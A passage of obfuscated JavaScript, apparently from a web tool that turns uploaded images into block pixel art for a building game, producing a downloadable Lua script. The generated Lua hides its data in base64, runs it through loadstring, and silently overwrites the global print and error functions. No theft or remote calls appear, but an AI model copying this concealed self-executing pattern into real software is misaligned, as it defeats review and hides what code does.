r':0xde,'g':0xd7,'b':0xb9,'stt':0x129},{'id':0x19d,'r':0xd2,'g':0xc7,'b':0xa8,'stt':0x12a},{'id':0x19e,'r':0xcd,'g':0xc6,'b':0x9f,'stt':0x12b},{'id':0x1a0,'r':0x30,'g':0x2d,'b':0x21,'stt':0x12c},{'id':0x1a1,'r':0x15,'g':0x5b,'b':0xb6,'stt':0x12d},{'id':0x1a2,'r':0x80,'g':0x55,'b':0x25,'stt':0x12e},{'id':0x1a5,'r':0x87,'g':0x67,'b':0x29,'stt':0x12f},{'id':0x1a6,'r':0x91,'g':0x95,'b':0x78,'stt':0x130},{'id':0x1a7,'r':0x8a,'g':0x75,'b':0x38,'stt':0x131},{'id':0x1a9,'r':0x96,'g':0x88,'b':0x5c,'stt':0x132},{'id':0x1aa,'r':0xc6,'g':0xba,'b':0x8d,'stt':0x133},{'id':0x1ae,'r':0x39,'g':0xb6,'b':0xe0,'stt':0x134},{'id':0x1c0,'r':0x2f,'g':0x39,'b':0x3a,'stt':0x135},{'id':0x1c1,'r':0xef,'g':0x8e,'b':0x20,'stt':0x136},{'id':0x1c2,'r':0xc9,'g':0x68,'b':0xff,'stt':0x137},{'id':0x1f5,'r':0x9c,'g':0x98,'b':0x7f,'stt':0x138},{'id':0x1f6,'r':0xad,'g':0xa2,'b':0x86,'stt':0x139},{'id':0x1f7,'r':0x52,'g':0x77,'b':0x4e,'stt':0x13a},{'id':0x1f8,'r':0x94,'g':0x8c,'b':0x77,'stt':0x13b},{'id':0x1f9,'r':0x84,'g':0x8a,'b':0x6f,'stt':0x13c},{'id':0x219,'r':0xc1,'g':0x4f,'b':0x25,'stt':0x13d},{'id':0x21c,'r':0xe7,'g':0xbe,'b':0x68,'stt':0x13e},{'id':0x223,'r':0x9c,'g':0x34,'b':0x16,'stt':0x13f},{'id':0x226,'r':0xff,'g':0xff,'b':0xb1,'stt':0x140},{'id':0x22e,'r':0xef,'g':0xba,'b':0x16,'stt':0x141},{'id':0x231,'r':0x49,'g':0x1e,'b':0x10,'stt':0x142},{'id':0x232,'r':0x7b,'g':0x59,'b':0x43,'stt':0x143},{'id':0x233,'r':0x54,'g':0x72,'b':0x25,'stt':0x144},{'id':0x23d,'r':0xa2,'g':0xa0,'b':0x9a,'stt':0x145},{'id':0xe6,'r':0xea,'g':0x5d,'b':0x7,'stt':0x146},{'id':0xef,'r':0x42,'g':0x84,'b':0x7,'stt':0x147},{'id':0x336,'r':0x9c,'g':0x71,'b':0x2c,'stt':0x148},{'id':0x1a8,'r':0x74,'g':0x7e,'b':0x5b,'stt':0x149},{'id':0x1a3,'r':0x8c,'g':0x66,'b':0x32,'stt':0x14a},{'id':0x1a4,'r':0xa1,'g':0x5d,'b':0x39,'stt':0x14b},{'id':0x2af,'r':0xfd,'g':0x9f,'b':0x95,'stt':0x14c},{'id':0x2ab,'r':0x8c,'g':0x86,'b':0x6f,'stt':0x14d},{'id':0x2ac,'r':0x7b,'g':0x3c,'b':0x86,'stt':0x14e},{'id':0x2ae,'r':0x5e,'g':0x1e,'b':0x9,'stt':0x14f},{'id':0x3b5,'r':0xff,'g':0xff,'b':0xd2,'stt':0x150},{'id':0x44e,'r':0x10,'g':0x59,'b':0x68,'stt':0x151},{'id':0x44f,'r':0x97,'g':0xff,'b':0xff,'stt':0x152},{'id':0x451,'r':0x1e,'g':0x28,'b':0x36,'stt':0x153},{'id':0x452,'r':0x1a,'g':0x26,'b':0x37,'stt':0x154},{'id':0x454,'r':0x73,'g':0x82,'b':0x83,'stt':0x155},{'id':0x455,'r':0x62,'g':0x69,'b':0x68,'stt':0x156},{'id':0x456,'r':0xd4,'g':0xd1,'b':0xc0,'stt':0x157},{'id':0x459,'r':0xd6,'g':0xda,'b':0xc2,'stt':0x158},{'id':0x45a,'r':0x61,'g':0x39,'b':0x1c,'stt':0x159},{'id':0x45b,'r':0x57,'g':0x39,'b':0x26,'stt':0x15a},{'id':0x45c,'r':0x3f,'g':0x2d,'b':0x25,'stt':0x15b},{'id':0x45e,'r':0xff,'g':0xa6,'b':0x29,'stt':0x15c},{'id':0x10a,'r':0xa9,'g':0x70,'b':0x1c,'stt':0x15d},{'id':0x10b,'r':0xff,'g':0x51,'b':0x7,'stt':0x15e},{'id':0x29a,'r':0xf6,'g':0xca,'b':0x88,'stt':0x15f}]);
var _0x10f7=['hide','toLowerCase','835qHtBuQ','height','.progress-bar','click','824449uKtQWZ','width','readAsDataURL','split','length','gif','show','jpg','.code','#uploaded_view','img1','#upload_file','data','setAttribute','75532fYjyJs','empty','css','{stt=','.popup','key=\x27','btoa','body','.selectPixel\x20option:selected','%</center>','getContext','#myImg','file_uploading','stt','Invalid\x20color\x20component','\x0a\x09\x20\x20local\x20x,y,z\x0a\x09\x20\x20local\x20Block\x20=\x20class.Block.new()\x0a\x09\x20\x20click=false\x0a\x09\x20\x20local\x20result,uin=Player:getHostUin()\x0a\x09\x20\x20function\x20ok(param)\x0a\x09\x09\x20\x20if\x20x==nil\x20then\x20\x0a\x09\x09\x09\x20\x20x=param.x\x0a\x09\x09\x09\x20\x20y=param.y\x0a\x09\x09\x09\x20\x20z=param.z\x0a\x09\x09\x09\x20\x20click=true\x20\x0a\x09\x09\x09\x20\x20Actor:setPosition(0,\x20math.ceil(x),\x20250,\x20math.ceil(z))\x0a\x09\x09\x09\x20\x20Block:placeBlock(1001,\x20math.ceil(x),\x20248,\x20math.ceil(z),0)\x0a\x09\x09\x20\x20end\x0a\x09\x20\x20end\x0a\x09\x20\x20ScriptSupportEvent:registerEvent([=[Player.ClickBlock]=],ok)\x0a\x09\x20\x20\x0a\x09\x20\x20function\x20build\x20(a)\x0a\x09\x09\x20\x20if\x20(a.content\x20==\x20\x27build\x27)and(','\x22\x20/>','remove','function\x20getStr(str)\x20local\x20b=\x27ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\x27\x20str=\x20string.gsub(str,\x20\x27[^\x27..b..\x27=]\x27,\x20\x27\x27)\x20return\x20(str:gsub(\x27.\x27,\x20function(x)\x20if\x20(x\x20==\x20\x27=\x27)\x20then\x20return\x20\x27\x27\x20end\x20error=b\x20local\x20r,f,io=\x27\x27,(b:find(x)-1)\x20for\x20i=6,1,-1\x20do\x20print,r=nil,r..(f%2^i-f%2^(i-1)>0\x20and\x20\x271\x27\x20or\x20\x270\x27)\x20end\x20return\x20r;\x20end):gsub(\x27%d%d%d?%d?%d?%d?%d?%d?\x27,\x20function(x)\x20if\x20(#x\x20~=\x208)\x20then\x20return\x20\x27\x27\x20end\x20local\x20c=0\x20for\x20i=1,8\x20do\x20c=c+(x:sub(i,i)==\x271\x27\x20and\x202^(8-i)\x20or\x200)\x20end\x20return\x20string.char(c)\x20end))\x20end\x0a','display','770730dFSSuI','text','val','.getcode','png','pathname','createObjectURL','19tUJZrC','/pixel/','.error_msg','append',',data=','loadstring(getStr(key))()','result','round','data:text/plain;charset=utf-8,','854zsxKCw','removeChild','<img\x20class=\x22pic\x22\x20src=\x22','removeClass','32681ttfMXu','src','getImageData','value','img','target','.file_remove','img2','style','abs','addClass','.progress','\x0a\x09\x09\x09\x09\x20\x20s_socot=','.button_outer','change','file_uploaded','log','77vywUhq','getElementById','\x0a\x09\x09\x09\x09\x20\x20sohang,socot=0,0\x0a\x09\x09\x09\x09\x20\x20for\x20i=1,#map\x20do\x0a\x09\x09\x09\x09\x09\x20\x20local\x20vitri_lib\x0a\x09\x09\x09\x09\x09\x20\x20for\x20j=1,#lib-1\x20do\x0a\x09\x09\x09\x09\x09\x09\x20\x20if\x20map[i]==lib[j].stt\x20then\x0a\x09\x09\x09\x09\x09\x09\x09\x20\x20vitri_lib=j\x0a\x09\x09\x09\x09\x09\x09\x09\x20\x20break\x0a\x09\x09\x09\x09\x09\x09\x20\x20end\x0a\x09\x09\x09\x09\x09\x20\x20end\x0a\x09\x09\x09\x09\x09\x20\x20Block:setBlockAll(x-socot,y,z+sohang,lib[vitri_lib].id,lib[vitri_lib].data)\x0a\x09\x09\x09\x09\x09\x20\x20if\x20i%s_socot==0\x20then\x0a\x09\x09\x09\x09\x09\x09\x20\x20socot=socot+1\x0a\x09\x09\x09\x09\x09\x09\x20\x20sohang=0\x0a\x09\x09\x09\x09\x09\x20\x20else\x0a\x09\x09\x09\x09\x09\x09\x20\x20sohang=sohang+1\x0a\x09\x09\x09\x09\x09\x20\x20end\x0a\x09\x09\x09\x09\x20\x20end\x0a\x09\x09\x09\x20\x20end\x0a\x09\x09\x20\x20end\x0a\x09\x20\x20end\x0a\x09\x20\x20ScriptSupportEvent:registerEvent([=[Player.NewInputContent]=],\x20build)\x0a\x09\x20\x20\x0a\x09\x20\x20local\x20x2,y2,z2\x0a\x09\x20\x20function\x20diBoTrenTroi(a)\x0a\x09\x09\x20\x20if\x20click\x20then\x20\x0a\x09\x09\x20\x20Block:destroyBlock(x2,y2-1,z2,true)\x0a\x09\x09\x20\x20_,x4,y4,z4=Actor:getPosition(0)\x0a\x09\x09\x20\x20x2=x4\x20\x0a\x09\x09\x20\x20y2=y4\x20\x0a\x09\x09\x20\x20z2=z4\x0a\x09\x09\x20\x20Block:placeBlock(1001,\x20x2,\x20y2-1,\x20z2,0)\x0a\x09\x09\x20\x20end\x0a\x09\x20\x20end\x20\x0a\x09\x20\x20ScriptSupportEvent:registerEvent([=[Game.Run]=],\x20diBoTrenTroi)\x0a\x09\x20\x20function\x20diBoTrenTroi2(a)\x0a\x09\x09\x20\x20_,x3,y3,z3=Actor:getPosition(0)\x0a\x09\x09\x20\x20x2=x3\x20\x0a\x09\x09\x20\x20y2=y3\x20\x0a\x09\x09\x20\x20z2=z3\x0a\x09\x20\x20end\x20\x0a\x09\x20\x20ScriptSupportEvent:registerEvent([=[Game.Start]=],\x20diBoTrenTroi2)\x0a\x09\x20\x20',',id=','onload','6509sZjURz','download','<center>','pop','jpeg','createElement','appendChild','==uin)\x20then\x20\x0a\x09\x09\x09\x20\x20if\x20(click)\x20then\x0a\x09\x09\x09\x09\x20\x20lib=','975059nIIdJk','\x0a\x09\x09\x09\x09\x20\x20map='];var _0x15080f=_0x5d67;(function(_0x5c6df3,_0x41976d){var _0x4e1dc1=_0x5d67;while(!![]){try{var _0x5ead3b=-parseInt(_0x4e1dc1(0xd3))*-parseInt(_0x4e1dc1(0x9d))+parseInt(_0x4e1dc1(0xc3))+-parseInt(_0x4e1dc1(0xaf))+parseInt(_0x4e1dc1(0x99))+parseInt(_0x4e1dc1(0xca))*-parseInt(_0x4e1dc1(0x91))+parseInt(_0x4e1dc1(0xa1))+-parseInt(_0x4e1dc1(0x8c))*parseInt(_0x4e1dc1(0x7b));if(_0x5ead3b===_0x41976d)break;else _0x5c6df3['push'](_0x5c6df3['shift']());}catch(_0x3fb3c0){_0x5c6df3['push'](_0x5c6df3['shift']());}}}(_0x10f7,0x8a988));var img1=document[_0x15080f(0x8d)](_0x15080f(0xab)),ctx1=img1[_0x15080f(0xb9)]('2d'),img2=document[_0x15080f(0x8d)](_0x15080f(0x82)),ctx2=img2[_0x15080f(0xb9)]('2d'),picture;function printPicture(){var _0x28f904=_0x15080f;console[_0x28f904(0x8b)](picture);}function changeSize(_0x420643,_0x34e2a9){var _0x3e2dc9=_0x15080f;sizeofPic=_0x34e2a9,img=_0x420643,img[_0x3e2dc9(0xa2)]=$(_0x3e2dc9(0xba))[0x0][_0x3e2dc9(0xa2)],img[_0x3e2dc9(0x9e)]=$(_0x3e2dc9(0xba))[0x0]['height'],img[_0x3e2dc9(0xa2)]>sizeofPic&&(img[_0x3e2dc9(0xa2)]>=img['height']?(img[_0x3e2dc9(0x9e)]=img[_0x3e2dc9(0x9e)]/(img[_0x3e2dc9(0xa2)]/sizeofPic),img[_0x3e2dc9(0xa2)]=sizeofPic):(img[_0x3e2dc9(0xa2)]=img['width']/(img['height']/sizeofPic),img['height']=sizeofPic)),img1[_0x3e2dc9(0xa2)]=img['width'],img1[_0x3e2dc9(0x9e)]=img[_0x3e2dc9(0x9e)],img2[_0x3e2dc9(0xa2)]=img['width'],img2[_0x3e2dc9(0x9e)]=img[_0x3e2dc9(0x9e)],ctx1['drawImage'](img,0x0,0x0,img['width'],img[_0x3e2dc9(0x9e)]);}function xacnhan(_0x54318b){var _0x28141d=_0x15080f;$(_0x28141d(0x86))[_0x28141d(0xa7)](),$('._getcode')[_0x28141d(0x9b)](),$(_0x28141d(0xb7))[_0x28141d(0xc5)]()!='0'&&(location[_0x28141d(0xc8)]==_0x28141d(0xcb)&&getcode(_0x54318b));}function resize(_0x534a57){$['getJSON']('./key.php?key='+_0x534a57,function(_0x55f002){var _0x218ad1=_0x5d67;changeSize(picture,_0x55f002[_0x218ad1(0x7e)]),$(_0x218ad1(0xc6))['val'](_0x534a57);});}function processImage(_0x44e941){var _0x508e88=_0x15080f;sizeofPic=0x100;var _0x45bf11=new FileReader();_0x45bf11[_0x508e88(0x90)]=function(_0xdeb0f5){var _0x496c4c=_0x508e88,_0x84c2b1=new Image();$(_0x496c4c(0xba))['attr'](_0x496c4c(0x7c),_0xdeb0f5['target']['result']),_0x84c2b1['onload']=function(){picture=_0x84c2b1,changeSize(picture,0x100);},_0x84c2b1[_0x496c4c(0x7c)]=_0xdeb0f5[_0x496c4c(0x80)][_0x496c4c(0xd0)];},_0x45bf11[_0x508e88(0xa3)](_0x44e941['files'][0x0]);}var btnUpload=$(_0x15080f(0xac)),btnOuter=$(_0x15080f(0x88));btnUpload['on'](_0x15080f(0x89),function(_0xeeca7d){var _0x580e0b=_0x15080f,_0x2adb65=btnUpload[_0x580e0b(0xc5)]()[_0x580e0b(0xa4)]('.')[_0x580e0b(0x94)]()[_0x580e0b(0x9c)]();if($['inArray'](_0x2adb65,[_0x580e0b(0xa6),_0x580e0b(0xc7),_0x580e0b(0xa8),_0x580e0b(0x95)])==-0x1)$(_0x580e0b(0xcc))[_0x580e0b(0xc4)]('Not\x20an\x20Image...');else{$(_0x580e0b(0xcc))[_0x580e0b(0xc4)](''),btnOuter[_0x580e0b(0x85)](_0x580e0b(0xbb)),setTimeout(function(){var _0x191ab5=_0x580e0b;btnOuter[_0x191ab5(0x85)](_0x191ab5(0x8a));},0xbb8);var _0xf17b11=URL[_0x580e0b(0xc9)](_0xeeca7d[_0x580e0b(0x80)]['files'][0x0]);processImage(_0xeeca7d[_0x580e0b(0x80)]),setTimeout(function(){var _0x3e94cd=_0x580e0b;$(_0x3e94cd(0xaa))[_0x3e94cd(0xcd)](_0x3e94cd(0xd5)+_0xf17b11+_0x3e94cd(0xbf))[_0x3e94cd(0x85)](_0x3e94cd(0xa7)),$(_0x3e94cd(0xb3))[_0x3e94cd(0xa7)]();},0xdac);}}),$(_0x15080f(0x81))['on'](_0x15080f(0xa0),function(_0x1bb027){var _0x5839a3=_0x15080f;$(_0x5839a3(0xb3))[_0x5839a3(0x9b)](),$('#uploaded_view')[_0x5839a3(0xd6)](_0x5839a3(0xa7)),$(_0x5839a3(0xaa))['find'](_0x5839a3(0x7f))[_0x5839a3(0xc0)](),btnOuter[_0x5839a3(0xd6)](_0x5839a3(0xbb)),btnOuter[_0x5839a3(0xd6)](_0x5839a3(0x8a));});function _0x5d67(_0x3da158,_0x41ee61){_0x3da158=_0x3da158-0x7b;var _0x10f737=_0x10f7[_0x3da158];return _0x10f737;}function rgbToHex1(_0x545599,_0x2c73c8,_0x365399){var _0x2eccff=_0x15080f;if(_0x545599>0xff||_0x2c73c8>0xff||_0x365399>0xff)throw _0x2eccff(0xbd);return(_0x545599<<0x10|_0x2c73c8<<0x8|_0x365399)['toString'](0x10);}load=0x0;function getcode(_0x534419){var _0x1854b7=_0x15080f;uidMW=0x3b9aca00+parseInt(_0x534419),array=[],denta=0x3c,text_val='',str='',lib='',count=0x0,i=0x0,j=0x0,done=0x1;var _0x2523ba=document[_0x1854b7(0x8d)](_0x1854b7(0xab)),_0x1c9877=img1[_0x1854b7(0xb9)]('2d'),_0x282d6a=document['getElementById'](_0x1854b7(0x82)),_0x5f25a8=img2[_0x1854b7(0xb9)]('2d');setInterval(function(){var _0x54c78b=_0x1854b7;$(_0x54c78b(0x9f))[_0x54c78b(0xb1)](_0x54c78b(0xa2),load+'%');if(done==0x1){count=count+0x1,load=count*0x64/(_0x2523ba['height']*_0x2523ba[_0x54c78b(0xa2)]),$(_0x54c78b(0x9f))[_0x54c78b(0xb0)](),$(_0x54c78b(0x9f))[_0x54c78b(0xcd)](_0x54c78b(0x93)+Math[_0x54c78b(0xd1)](load)+_0x54c78b(0xb8));j==_0x2523ba[_0x54c78b(0x9e)]&&(i=i+0x1,j=0x0);;j<_0x2523ba[_0x54c78b(0x9e)]&&(j=j+0x1);;i==_0x2523ba[_0x54c78b(0xa2)]&&(done=0x0);;imgData=_0x1c9877[_0x54c78b(0x7d)](i,j,0x1,0x1)[_0x54c78b(0xad)],r=imgData[0x0],g=imgData[0x1],b=imgData[0x2],k=0x0,far1=0x64;for(m=0x0;m<check['length'];m++){far2=Math[_0x54c78b(0x84)](r-check[m]['r'])+Math[_0x54c78b(0x84)](g-check[m]['g'])+Math[_0x54c78b(0x84)](b-check[m]['b']),far2<far1&&(far1=far2,k=m);}stt=check[k][_0x54c78b(0xbc)],id=check[k]['id'],data=check[k]['data'],str=str+stt,_0x5f25a8['fillStyle']='#'+rgbToHex1(check[stt]['r'],check[stt]['g'],check[stt]['b']),_0x5f25a8['fillRect'](i,j,0x1,0x1);if(array[_0x54c78b(0xa5)]!=0x0){let _0x1a2317=0x0;for(l=0x0;l<array[_0x54c78b(0xa5)];l++){stt==array[l]&&_0x1a2317++;}_0x1a2317==0x0&&(array[array[_0x54c78b(0xa5)]]=stt);}else array[array['length']]=stt;i==_0x2523ba['width']-0x1&&j==_0x2523ba[_0x54c78b(0x9e)]-0x1?str=str:str=str+',';}if(done==0x0){done=0x3,text_val='{'+str+'}';for(m=0x0;m<array[_0x54c78b(0xa5)];m++){lib=lib+_0x54c78b(0xb2)+array[m]+_0x54c78b(0x8f)+check[array[m]]['id']+_0x54c78b(0xce)+check[array[m]][_0x54c78b(0xad)]+'},';}lib='{'+lib+'0}',ddd=_0x54c78b(0xbe)+uidMW+_0x54c78b(0x98)+lib+_0x54c78b(0x9a)+text_val+_0x54c78b(0x87)+_0x2523ba[_0x54c78b(0x9e)]+_0x54c78b(0x8e),eee=_0x54c78b(0xc1),fff=_0x54c78b(0xcf),ggg=_0x54c78b(0xb4)+window[_0x54c78b(0xb5)](ddd)+'\x27',textcode=eee+ggg+'\x0a'+fff,$(_0x54c78b(0xc6))[_0x54c78b(0xa7)](),$(_0x54c78b(0xa9))[_0x54c78b(0xc4)](textcode);}},0x1);}$(_0x15080f(0xc6))['click'](function(){download();});function download(){var _0x77fba=_0x15080f,_0x7f77ad=document[_0x77fba(0x96)]('a');_0x7f77ad[_0x77fba(0xae)]('href',_0x77fba(0xd2)+encodeURIComponent($(_0x77fba(0xa9))[_0x77fba(0xc4)]())),_0x7f77ad[_0x77fba(0xae)](_0x77fba(0x92),'script_'+Date['now']()),_0x7f77ad[_0x77fba(0x83)][_0x77fba(0xc2)]='none',document[_0x77fba(0xb6)][_0x77fba(0x97)](_0x7f77ad),_0x7f77ad['click'](),document[_0x77fba(0xb6)][_0x77fba(0xd4)](_0x7f77ad);}